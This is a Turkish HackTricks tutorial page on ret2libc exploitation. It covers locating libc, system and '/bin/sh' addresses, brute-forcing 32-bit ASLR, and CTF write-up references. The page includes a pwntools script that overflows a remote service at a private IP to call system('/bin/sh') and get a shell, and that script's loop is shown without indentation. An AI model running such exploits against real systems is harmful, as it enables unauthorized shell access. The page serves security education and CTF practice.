# Ret2lib

{{#include ../../../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**Ret2Libc**'nin özü, bir saldırganın sağladığı shellcode'u yığın üzerinde çalıştırmak yerine, bir zayıf programın yürütme akışını paylaşılan bir kütüphanedeki (örneğin, **system**, **execve**, **strcpy**) bir işleve yönlendirmektir. Saldırgan, yığın üzerindeki dönüş adresini istenen kütüphane işlevine işaret edecek şekilde değiştiren bir yük oluşturur ve çağrı konvansiyonuna göre gerekli argümanların doğru bir şekilde ayarlandığından emin olur.

### **Örnek Adımlar (basitleştirilmiş)**

- Çağrılacak işlevin adresini al (örneğin, system) ve çağrılacak komutu al (örneğin, /bin/sh)
- İlk argümanı komut dizesine işaret eden ve yürütme akışını işleve iletmek için bir ROP zinciri oluştur

## Adresleri Bulma

- Kullanılan `libc`'nin mevcut makineden olduğunu varsayarsak, bellekte nerede yükleneceğini bulmak için:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Eğer ASLR'nin libc'nin adresini değiştirip değiştirmediğini kontrol etmek istiyorsanız şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Kullanılan libc'yi bilmek, `system` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Kullanılan libc'yi bilmek, `/bin/sh` fonksiyonuna olan ofseti bulmayı da mümkün kılar:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF Kullanımı

Kullanılan libc'yi bilmek, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak için Peda veya GEF kullanmayı da mümkün kılar:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps Kullanımı

Eğer süreç her konuştuğunuzda **çocuklar** oluşturuyorsa (ağ sunucusu) o dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecek).

Burada **libc'nin süreç içinde tam olarak nerede yüklü olduğunu** ve **her çocuğun süreç için nerede yükleneceğini** bulabilirsiniz.

![](<../../../images/image (853).png>)

Bu durumda **0xb75dc000** adresinde yüklenmiştir (Bu libc'nin temel adresi olacaktır).

## Bilinmeyen libc

Bilinmeyen bir libc'nin yükleniyor olabileceği durumlar olabilir (çünkü erişiminiz olmayan bir sunucuda bulunabilir). Bu durumda, **bazı adresleri sızdırmak ve hangi libc** kütüphanesinin kullanıldığını bulmak için açığı kötüye kullanabilirsiniz:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

Ve bunun için bir pwntools şablonunu burada bulabilirsiniz:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasını kontrol edin ve libc içindeki **birkaç adres** kullanarak **kullanılan sürümü** öğrenin.

## 32 bit'te ASLR'yi Aşmak

Bu kaba kuvvet saldırıları **yalnızca 32 bit sistemler için** faydalıdır.

- Eğer istismar yerel ise, libc'nin temel adresini kaba kuvvetle bulmayı deneyebilirsiniz (32 bit sistemler için faydalıdır):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Uzak bir sunucuya saldırıyorsanız, **`usleep` `libc` fonksiyonunun adresini brute-force ile bulmayı** deneyebilirsiniz, argüman olarak 10 (örneğin) geçerek. Eğer bir noktada **sunucu yanıt vermek için 10s ekstra alıyorsa**, bu fonksiyonun adresini bulmuşsunuzdur.

## One Gadget

Sadece **bir** belirli **adrese** atlayarak bir shell çalıştırın:

{{#ref}}
one-gadget.md
{{#endref}}

## x86 Ret2lib Kod Örneği

Bu örnekte ASLR brute-force kodun içine entegre edilmiştir ve savunmasız ikili dosya uzak bir sunucuda bulunmaktadır:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Örneği

Aşağıdaki örneği kontrol edin:

{{#ref}}
../
{{#endref}}

## ARM64 Ret2lib Örneği

ARM64 durumunda, ret talimatı x30 kaydının işaret ettiği yere atlar, stack kaydının işaret ettiği yere değil. Bu yüzden biraz daha karmaşık.

Ayrıca ARM64'te bir talimat, talimatın yaptığı şeyi yapar (talimatların ortasında atlamak ve onları yeni talimatlara dönüştürmek mümkün değildir).

Aşağıdaki örneği kontrol edin:

{{#ref}}
ret2lib-+-printf-leak-arm64.md
{{#endref}}

## Ret-into-printf (veya puts)

Bu, belirli verileri argüman olarak yerleştirerek `printf`/`puts` çağrısı yaparak **işlemden bilgi sızdırmayı** sağlar. Örneğin, `puts`'un GOT'daki adresini bir `puts` çağrısında yerleştirmek, **`puts`'un bellek adresini sızdırır**.

## Ret2printf

Bu, temel olarak bir **Ret2lib'i `printf` format dizeleri zafiyeti haline dönüştürmek için kötüye kullanmak** anlamına gelir; `ret2lib` kullanarak printf'i istismar etmek için değerlerle çağırmak (gereksiz gibi görünebilir ama mümkündür):

{{#ref}}
../../format-strings/
{{#endref}}

## Diğer Örnekler ve referanslar

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, libc'deki bir fonksiyonun adresine sızdırma verildiğinde, bir gadget kullanarak
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR etkin ama PIE yok, ilk adım, puts'u çağırmak ve sızdırmak için kanaryanın 0x00 byte'ına kadar bir taşmayı doldurmaktır. Kanarya ile puts'un GOT'dan adresini sızdırmak için bir ROP gadget'ı oluşturulur ve `system('/bin/sh')` çağırmak için bir ROP gadget'ı.
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bit, ASLR etkin, kanarya yok, ana fonksiyondan bir çocuk fonksiyonda stack overflow. Puts'un GOT'dan adresini sızdırmak için puts'u çağıran bir ROP gadget'ı ve ardından bir gadget çağırır.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bit, pie yok, kanarya yok, relro yok, nx. Yazma fonksiyonunu kullanarak yazma (libc) adresini sızdırır ve bir gadget çağırır.
- [https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html](https://guyinatuxedo.github.io/14-ret_2_system/asis17_marymorton/index.html)
- Stack'ten kanaryayı sızdırmak için bir format dizesi kullanır ve `/bin/sh` adresi ile sisteme çağırmak için bir buffer overflow kullanır (GOT'dadır).
- [https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html](https://guyinatuxedo.github.io/14-ret_2_system/tu_guestbook/index.html)
- 32 bit, relro yok, kanarya yok, nx, pie. Stack'ten libc ve heap adreslerini sızdırmak için kötü bir indeksleme kullanır. `system('/bin/sh')` çağırarak bir ret2lib yapmak için buffer overflow'u kötüye kullanır (bir kontrolü atlatmak için heap adresi gereklidir).

{{#include ../../../banners/hacktricks-training.md}}
